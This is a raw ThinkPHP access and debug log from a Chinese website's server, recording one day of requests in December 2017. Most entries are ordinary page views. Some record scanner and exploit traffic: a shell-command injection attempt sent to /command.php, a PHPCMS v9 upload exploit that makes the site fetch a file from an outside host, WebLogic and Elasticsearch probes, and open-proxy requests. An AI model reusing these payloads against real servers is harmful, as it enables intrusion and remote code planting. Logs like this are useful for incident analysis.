[ 2017-12-29T00:32:41+08:00 ] 172.17.195.153 47.93.112.232 GET /
[ log ] 39.104.28.64:80/ [运行时间：0.024477s][吞吐率：40.85req/s] [内存消耗：2,781.59kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.104.28.64:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T02:11:24+08:00 ] 172.17.195.153 107.23.161.235 GET /
[ log ] 39.106.4.226/ [运行时间：0.024974s][吞吐率：40.04req/s] [内存消耗：2,782.26kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.106.4.226',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/53.0.3009.107 Safari/537.32',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T03:01:26+08:00 ] 172.17.195.153 115.239.212.10 GET /
[ log ] www.xinchumenye.com/ [运行时间：0.024768s][吞吐率：40.37req/s] [内存消耗：2,782.33kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
  'referer' => 'http://www.baidu.com/s?wd=PW9',
  'connection' => 'Keep-Alive',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en,*',
  'host' => 'www.xinchumenye.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T05:15:36+08:00 ] 172.17.195.153 94.102.49.174 GET http://www.baidu.com/cache/global/img/gs.gif
[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.011744s][吞吐率：85.15req/s] [内存消耗：1,508.71kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T06:31:12+08:00 ] 172.17.195.153 120.132.3.65 GET http://www.qq.com/404/search_children.js
[ log ] www.qq.comhttp://www.qq.com/404/search_children.js [运行时间：0.010935s][吞吐率：91.45req/s] [内存消耗：1,508.88kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => 'search_children.js',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.qq.com',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T07:04:56+08:00 ] 172.17.195.153 106.11.227.165 GET /
[ log ] xinchumenye.com/ [运行时间：0.023733s][吞吐率：42.14req/s] [内存消耗：2,782.09kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'host' => 'xinchumenye.com',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T08:19:07+08:00 ] 172.17.195.153 116.62.176.205 GET /
[ log ] 39.104.61.64:80/ [运行时间：0.024718s][吞吐率：40.46req/s] [内存消耗：2,781.59kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.104.61.64:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T11:32:22+08:00 ] 172.17.195.153 106.11.227.17 GET /
[ log ] www.xinchumenye.com/ [运行时间：0.024637s][吞吐率：40.59req/s] [内存消耗：2,782.41kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'host' => 'www.xinchumenye.com',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T13:55:58+08:00 ] 172.17.195.153 45.55.7.20 GET /
[ log ] 39.106.4.226/ [运行时间：0.024132s][吞吐率：41.44req/s] [内存消耗：2,781.69kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.106.4.226',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T14:06:04+08:00 ] 172.17.195.153 201.53.253.208 POST /command.php
[ log ] 39.106.4.226/command.php [运行时间：0.011214s][吞吐率：89.17req/s] [内存消耗：1,508.56kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'command.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '208',
)
[ info ] [ PARAM ] array (
  'cmd' => 'cd /var/tmp &amp;&amp; echo -ne \\\\x3610cker &gt; 610cker.txt &amp;&amp; cat 610cker.txt',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T15:47:14+08:00 ] 172.17.195.153 140.205.201.32 POST /index.php?m=member&c=index&a=register&siteid=1
[ log ] xinchumenye.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.023900s][吞吐率：41.84req/s] [内存消耗：2,784.02kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => 'xinchumenye.com:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '171',
)
[ info ] [ PARAM ] array (
  'm' => 'member',
  'c' => 'index',
  'a' => 'register',
  'siteid' => '1',
  'modelid' => '11',
  'username' => 'nRflzVpx',
  'password' => 'nRflzVpx',
  'email' => 'nRflzVpx@aliyun.com',
  'info' => 
  array (
    'content' => '&lt;img src=http://120.26.55.211/s.txt?.php#.jpg&gt;',
  ),
  'dosubmit' => '1',
  'protocol' => '',
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T15:47:15+08:00 ] 172.17.195.153 140.205.201.32 GET /index.php?m=wap&a=index&siteid=1
[ log ] xinchumenye.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.023787s][吞吐率：42.04req/s] [内存消耗：2,782.85kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => 'xinchumenye.com:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
)
[ info ] [ PARAM ] array (
  'm' => 'wap',
  'a' => 'index',
  'siteid' => '1',
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T16:23:09+08:00 ] 172.17.195.153 59.110.6.177 GET /
[ log ] 39.104.9.148:80/ [运行时间：0.024660s][吞吐率：40.55req/s] [内存消耗：2,781.59kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.104.9.148:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T16:37:35+08:00 ] 172.17.195.153 80.82.78.50 GET http://www.baidu.com/cache/global/img/gs.gif
[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.011587s][吞吐率：86.30req/s] [内存消耗：1,508.71kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T19:22:06+08:00 ] 172.17.195.153 182.150.27.152 GET /wls-wsat/CoordinatorPortType11
[ log ] 39.106.4.226/wls-wsat/CoordinatorPortType11 [运行时间：0.012347s][吞吐率：80.99req/s] [内存消耗：1,508.96kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType11',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.106.4.226',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T20:26:20+08:00 ] 172.17.195.153 139.162.88.63 GET http://clientapi.ipip.net/echo.php?info=1234567890
[ log ] clientapi.ipip.nethttp://clientapi.ipip.net/echo.php?info=1234567890 [运行时间：0.011371s][吞吐率：87.94req/s] [内存消耗：1,509.29kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'echo.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'clientapi.ipip.net',
  'user-agent' => 'Go-http-client/1.1',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  'info' => '1234567890',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:14:36+08:00 ] 172.17.195.153 106.11.224.77 GET /
[ log ] 39.106.4.226/ [运行时间：0.024082s][吞吐率：41.52req/s] [内存消耗：2,781.94kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.p)',
  'host' => '39.106.4.226',
  'referer' => 'http://39.106.4.226/',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip,deflate',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:17:23+08:00 ] 172.17.195.153 106.11.224.79 GET /rs-status
[ log ] 39.106.4.226:80/rs-status [运行时间：0.010957s][吞吐率：91.27req/s] [内存消耗：1,508.94kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'rs-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:19:30+08:00 ] 172.17.195.153 106.11.224.152 GET /ganglia/index.php
[ log ] 39.106.4.226:80/ganglia/index.php [运行时间：0.010846s][吞吐率：92.20req/s] [内存消耗：1,509.27kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ganglia',
    1 => 'index.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:21:16+08:00 ] 172.17.195.153 106.11.224.179 GET /index.php
[ log ] 39.106.4.226:80/index.php [运行时间：0.024664s][吞吐率：40.55req/s] [内存消耗：2,782.26kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:27:33+08:00 ] 172.17.195.153 106.11.224.113 GET /jobs/
[ log ] 39.106.4.226:80/jobs/ [运行时间：0.010932s][吞吐率：91.47req/s] [内存消耗：1,508.91kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'jobs',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:35:47+08:00 ] 172.17.195.153 106.11.224.228 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.024724s][吞吐率：40.45req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:41:42+08:00 ] 172.17.195.153 106.11.224.180 POST /nkztrjpvmqhe
[ log ] 39.106.4.226:80/nkztrjpvmqhe [运行时间：0.011640s][吞吐率：85.91req/s] [内存消耗：1,508.46kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'nkztrjpvmqhe',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '39.106.4.226:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.elasticsearch_unauthorized)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '22',
)
[ info ] [ PARAM ] array (
  '{"aliyun":_"vulntest"}' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:41:42+08:00 ] 172.17.195.153 106.11.224.231 GET /nkztrjpvmqhe
[ log ] 39.106.4.226:80/nkztrjpvmqhe [运行时间：0.011665s][吞吐率：85.73req/s] [内存消耗：1,509.03kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'nkztrjpvmqhe',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '39.106.4.226:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.elasticsearch_unauthorized)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:41:42+08:00 ] 172.17.195.153 106.11.224.39 DELETE /nkztrjpvmqhe
[ log ] 39.106.4.226:80/nkztrjpvmqhe [运行时间：0.010794s][吞吐率：92.64req/s] [内存消耗：1,508.70kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'nkztrjpvmqhe',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '39.106.4.226:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.elasticsearch_unauthorized)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:45:51+08:00 ] 172.17.195.153 106.11.224.41 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.023533s][吞吐率：42.49req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:48:23+08:00 ] 172.17.195.153 106.11.224.16 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.024754s][吞吐率：40.40req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
